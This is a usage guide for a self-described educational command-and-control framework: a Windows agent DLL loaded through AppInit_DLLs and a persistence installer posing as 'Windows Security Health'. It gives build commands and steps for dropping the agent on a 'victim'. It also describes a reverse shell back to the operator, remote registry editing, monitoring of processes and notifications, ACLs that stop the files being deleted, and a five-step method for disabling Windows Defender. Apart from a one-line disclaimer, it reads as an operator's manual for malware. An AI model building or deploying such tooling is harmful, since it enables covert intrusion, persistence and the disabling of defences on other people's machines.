# C2 Server — Usage Guide
> **Educational project** — built for a cybersecurity course. Use only on machines you own or have explicit written permission to test on.

---

## Table of Contents
1. [Architecture Overview](#architecture-overview)
2. [Project Files](#project-files)
3. [Setup & Build](#setup--build)
4. [Deployment on Victim](#deployment-on-victim)
5. [Starting the C2 Server](#starting-the-c2-server)
6. [Connecting as Operator](#connecting-as-operator)
7. [Module Reference](#module-reference)
   - [SSH](#ssh)
   - [RDP](#rdp)
   - [Registry](#registry)
   - [Activity Monitor](#activity-monitor)
   - [Notifications](#notifications)
   - [Reverse Shell](#reverse-shell)
   - [Windows Defender](#windows-defender)
8. [Persistence & Failsafe](#persistence--failsafe)
9. [Architecture Deep-Dive](#architecture-deep-dive)

---

## Architecture Overview

```
┌─────────────────────┐          JSON/TCP :4444          ┌──────────────────────┐
│   client.py         │ ◄──────────────────────────────► │   server.py          │
│   (Operator CLI)    │                                   │   (C2 Server)        │
└─────────────────────┘                                   └──────────┬───────────┘
                                                                     │ JSON/TCP :4444
                                                                     │
                                                          ┌──────────▼───────────┐
                                                          │  AppInit_DLLs.dll    │
                                                          │  (Victim Agent)      │
                                                          └──────────────────────┘
                                                                     │
                                              Raw TCP :4445 (shell only, direct)
                                                                     │
                                                          ┌──────────▼───────────┐
                                                          │   client.py          │
                                                          │   (shell listener)   │
                                                          └──────────────────────┘
```

- **Operator** connects to the server via `client.py`
- **Agent** (`AppInit_DLLs.dll`) runs on the victim and connects back to the server
- The server **relays** commands from operator → agent and **broadcasts** victim events → operator
- The **reverse shell** is a direct TCP connection (bypasses the server entirely)

---

## Project Files

| File | Role |
|---|---|
| `server.py` | C2 server — relays commands, broadcasts push events |
| `client.py` | Operator interactive CLI |
| `dll.cpp` | Windows agent DLL source (compiles to `AppInit_DLLs.dll`) |
| `SAFE.cpp` | Persistence installer source (compiles to `SAFE.exe`) |
| `AppInit_DLLs.dll` | Compiled agent — drop on victim |
| `SAFE.exe` | Compiled installer — run once on victim to set up persistence |
| `modules/ssh_module.py` | Server-side SSH (Paramiko) |
| `modules/rdp_module.py` | Server-side RDP launcher |
| `modules/registry_module.py` | Server-side registry stub |
| `modules/activity_module.py` | Server-side activity (psutil) |
| `requirements.txt` | Python deps: `paramiko`, `psutil` |

---

## Setup & Build

### Python (server + client)
```bash
pip3 install -r requirements.txt
```

### Compile the DLL (requires MinGW cross-compiler on macOS/Linux)
```bash
# Without SSH support (simpler, no libssh2 needed)
x86_64-w64-mingw32-g++ -shared -o AppInit_DLLs.dll dll.cpp \
    -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
    -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 \
    -std=c++17 -O2 -fpermissive

# With SSH support (requires libssh2 cross-compiled for Windows)
x86_64-w64-mingw32-g++ -shared -o AppInit_DLLs.dll dll.cpp \
    -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
    -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 -lssh2 \
    -DC2_HAS_LIBSSH2 -std=c++17 -O2 -fpermissive
```

### Compile SAFE.exe
```bash
x86_64-w64-mingw32-g++ -o SAFE.exe SAFE.cpp \
    -ladvapi32 -lshell32 -lshlwapi \
    -static -std=c++17 -O2 -mwindows
```

### Install MinGW (macOS)
```bash
brew install mingw-w64
```

---

## Deployment on Victim

### Step 1 — Configure the agent

Before compiling, set the C2 server address by editing these lines in `dll.cpp`:
```cpp
static std::string g_host  = "YOUR_SERVER_IP";
static int         g_port  = 4444;
static std::string g_token = "your_secret_token";
```

Or set them as environment variables on the victim at runtime:

| Variable | Default | Purpose |
|---|---|---|
| `C2_HOST` | `127.0.0.1` | Your C2 server IP |
| `C2_PORT` | `4444` | C2 server port |
| `C2_TOKEN` | `changeme` | Auth token (must match server) |

### Step 2 — Transfer files to victim

Drop both files onto the victim machine (USB, share, download, etc.):
```
AppInit_DLLs.dll   ← the agent
SAFE.exe           ← the persistence installer
```
Keep them in the **same folder** — `SAFE.exe` looks for `AppInit_DLLs.dll` next to itself.

### Step 3 — Run SAFE.exe on the victim (first time only, as admin)

```
Double-click SAFE.exe  →  UAC prompt appears  →  click Yes
```

What SAFE.exe does automatically:
1. Copies itself → `C:\Users\<victim>\SAFE.exe`
2. Copies the DLL → `C:\Users\<victim>\AppInit_DLLs.dll`
3. Sets registry for auto-load on every boot:
   ```
   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
     AppInit_DLLs              = C:%HOMEPATH%\AppInit_DLLs.dll
     LoadAppInit_DLLs          = 1
     RequireSignedAppInit_DLLs = 0
   ```
4. Sets a Run key for self-healing on every login:
   ```
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
     "Windows Security Health" = "C:\Users\<victim>\SAFE.exe /check"
   ```
5. ACL-protects both files (regular users cannot delete them)

After this, **the DLL loads automatically on every reboot**. No further action needed.

### Step 4 — Verify connection

Start your C2 server and watch for the agent to appear in the logs.

---

## Starting the C2 Server

```bash
# Default (port 4444, token "changeme")
python3 server.py

# Custom port and token
python3 server.py --port 4444 --token mysecrettoken

# With TLS
python3 server.py --certfile cert.pem --keyfile key.pem
```

---

## Connecting as Operator

```bash
# Default
python3 client.py

# Custom server
python3 client.py --host 192.168.1.10 --port 4444 --token mysecrettoken
```

Type `help` at the `c2>` prompt for a full command reference.

> **Push alerts** from the victim appear automatically as coloured banners without interrupting your session.

---

## Module Reference

---

### SSH

Connect to remote machines via SSH from the **victim's** network context.

```
c2> ssh connect <host> <port> <user> <password>
c2> ssh exec <session_id> <command>
c2> ssh list
c2> ssh disconnect <session_id>
```

**Example:**
```
c2> ssh connect 10.0.0.5 22 admin password123
c2> ssh exec 0 whoami
c2> ssh disconnect 0
```

---

### RDP

Open RDP sessions or probe whether a host has RDP available.

```
c2> rdp probe <host>           # Check if port 3389 is open
c2> rdp open <host> <user>     # Launch mstsc.exe on the victim
c2> rdp list                   # List open sessions
c2> rdp close <session_id>     # Close a session
```

---

### Registry

Read and write the Windows registry on the victim.

```
c2> reg list_keys   <hive> <path>
c2> reg list_values <hive> <path>
c2> reg read        <hive> <path> <name>
c2> reg write       <hive> <path> <name> <type> <value>
c2> reg delete      <hive> <path> <name>
c2> reg create_key  <hive> <path>
c2> reg delete_key  <hive> <path>
```

**Hives:** `HKLM` `HKCU` `HKCR` `HKU` `HKCC`

**Types:** `SZ` `EXPAND_SZ` `DWORD` `QWORD` `BINARY` `MULTI_SZ`

**Example:**
```
c2> reg read HKLM SOFTWARE\Microsoft\Windows NT\CurrentVersion ProductName
c2> reg write HKCU SOFTWARE\MyApp Setting SZ HelloWorld
```

---

### Activity Monitor

Full visibility into what is running on the victim machine.

```
c2> act processes               # Full process list
c2> act system_stats            # CPU%, RAM, disk C:
c2> act network                 # All TCP connections with PIDs
c2> act top_mem [n=10]          # Top N processes by memory
c2> act top_cpu [n=10]          # Top N processes by CPU
c2> act monitor start [ms=5000] # Background snapshots every N ms
c2> act monitor stop
c2> act monitor snapshots       # Retrieve collected snapshots
```

**Process list includes:** `pid`, `ppid`, `name`, `username` (DOMAIN\user), `exe_path`, `cmdline`, `mem_kb`, `peak_mem_kb`, `page_faults`, `cpu_pct`, `thread_cnt`, `session_id`

---

### Notifications

Monitor what appears on the victim's screen, and push messages to them.

#### Receive victim notifications (victim → you)
```
c2> notify start       # Hook Windows events — toasts, alerts, dialogs sent to you live
c2> notify stop
c2> notify status
```

Incoming events appear as automatic coloured banners:
```
╔══════════════════════════════════════════╗
║  ⚠  ALERT  [notification]               ║
║  Title: Windows Security Alert           ║
║  Body:  Firewall blocked a connection    ║
╚══════════════════════════════════════════╝
```

#### Send messages to the victim

```
# Modal popup (victim must click OK to dismiss)
c2> notify popup "Title" "Message"
c2> notify popup "Warning" "Disk almost full" warning
c2> notify popup "Error" "Critical failure" error

# System-tray balloon (disappears after timeout in ms)
c2> notify balloon "Reminder" "Check your email" 5000
c2> notify balloon "Alert" "Low battery" 8000 warning
```

**Popup types:** `info` (default) | `warning` | `error`

---

### Reverse Shell

Get a live interactive shell on the victim with full terminal passthrough.

```
c2> shell <your_ip> [port=4445] [cmd.exe|powershell.exe]
c2> shell stop
c2> shell status
```

**How it works:**
1. `client.py` opens a TCP listener on your machine at `<your_ip>:<port>`
2. Server relays a `start` command to the DLL agent
3. DLL spawns `cmd.exe` (hidden) and connects back directly to your listener
4. Your terminal enters raw passthrough mode — everything you type goes to the shell

**Controls:**
- `Ctrl+]` — **detach** (shell stays alive on victim, you return to `c2>` prompt)
- `Ctrl+C` — kills only if the shell process itself catches it

**Examples:**
```
c2> shell 192.168.1.10
c2> shell 192.168.1.10 4445 powershell.exe
c2> shell status
c2> shell stop
```

> **Note:** Shell traffic is a **direct TCP connection** between operator and victim.  
> It does **not** pass through the C2 server.

---

### Windows Defender

Disable, enable, and manage Defender exclusions on the victim.

> Requires the agent process to have **admin privileges**.

```
c2> defender status                          # Service state, tamper protection, exclusion list
c2> defender disable                         # Disable Defender (~20s, 5 layered methods)
c2> defender enable                          # Re-enable Defender and restart services
c2> defender exclusions                      # List all path/process/extension exclusions
c2> defender exclude path C:\Tools           # Add a folder exclusion
c2> defender exclude process notepad.exe     # Add a process exclusion
c2> defender exclude ext .ps1               # Add a file-extension exclusion
c2> defender unexclude path C:\Tools
c2> defender unexclude process notepad.exe
```

**Disable runs 5 independent steps — each reported separately:**

| Step | Method | Survives reboot |
|---|---|---|
| 1 | Tamper Protection registry key (`TamperProtection = 0`) | ✅ needs SYSTEM token |
| 2 | Policy keys `DisableAntiSpyware` / `DisableAntiVirus` | ✅ admin |
| 3 | Real-time protection policy sub-keys (5 values) | ✅ admin |
| 4 | `powershell Set-MpPreference` (8 flags) | session only |
| 5 | SCM: stop + disable `WinDefend`, `WdNisSvc`, `WdFilter` | ✅ admin |

---

## Persistence & Failsafe

### Survival after reboot

```
Machine reboots
  └─► Windows reads AppInit_DLLs registry key
        └─► Loads AppInit_DLLs.dll into every GUI process automatically
              └─► Singleton mutex — only ONE process becomes the active agent
                    ├─► failsafe_mod::ensure() runs in background thread
                    │     ├─ Re-copies DLL to %USERPROFILE% if missing
                    │     ├─ Re-copies SAFE.exe if missing
                    │     ├─ Re-writes AppInit_DLLs registry keys if removed
                    │     ├─ Re-writes Run key if removed
                    │     └─ Re-applies file ACL protection
                    └─► agent_loop() connects back to C2 server
```

### Three persistence layers

| Layer | Trigger | Mechanism |
|---|---|---|
| `AppInit_DLLs` | Every boot | Auto-loads DLL into every GUI process |
| `HKCU\Run` key | Every user login | Runs `SAFE.exe /check` silently |
| `failsafe_mod` in DLL | Every DLL load | Self-heals everything in-process |

### File protection

After installation, both files have a restrictive ACL:

```
DENY  DELETE / WRITE_DAC / WRITE_OWNER  →  Everyone
ALLOW FULL CONTROL                       →  NT AUTHORITY\SYSTEM
ALLOW FULL CONTROL                       →  BUILTIN\Administrators
```

A regular user gets **"Access Denied"**. An admin must take ownership (UAC) before deleting.

### SAFE.exe modes

| Command | Description |
|---|---|
| `SAFE.exe` | Full install — copies files, sets registry, ACLs, UAC elevation |
| `SAFE.exe /check` | Silent self-heal — re-verifies everything, no UAC prompt |
| `SAFE.exe /remove` | Clean uninstall — removes registry, Run key, unprotects files |

---

## Architecture Deep-Dive

### Wire Protocol

All C2 traffic is **newline-delimited JSON** over TCP.

**Operator → Server (command):**
```json
{"module": "activity", "payload": {"action": "processes"}}
```

**Server → Operator (response):**
```json
{"status": "ok", "processes": [...]}
```

**Agent → Server (unsolicited push event):**
```json
{"event": "notification", "title": "UAC Prompt", "body": "...", "timestamp": "..."}
```
The server instantly broadcasts push events to **all** connected operators.

### Authentication

```json
{"token": "changeme"}                        // operator
{"token": "changeme", "role": "agent"}       // DLL agent
```

### Command Relay

Modules not implemented in Python (`shell`, `registry`, `notify`, `activity` on Windows) are **automatically relayed** to the connected DLL agent:

```
Operator:  {"module": "shell", "payload": {"action": "status"}}
Server:    "shell" not in Python MODULES → relay to agent
Agent:     executes locally, returns {"status": "ok", "running": false, "pid": 0}
Operator:  receives response
```

### Singleton Guard (DLL)

`AppInit_DLLs` loads the DLL into hundreds of processes simultaneously. A named mutex (`Global\__C2AgentMtx__`) ensures exactly **one** process runs the agent. All others load the DLL silently and exit `DLL_PROCESS_ATTACH` without doing anything.
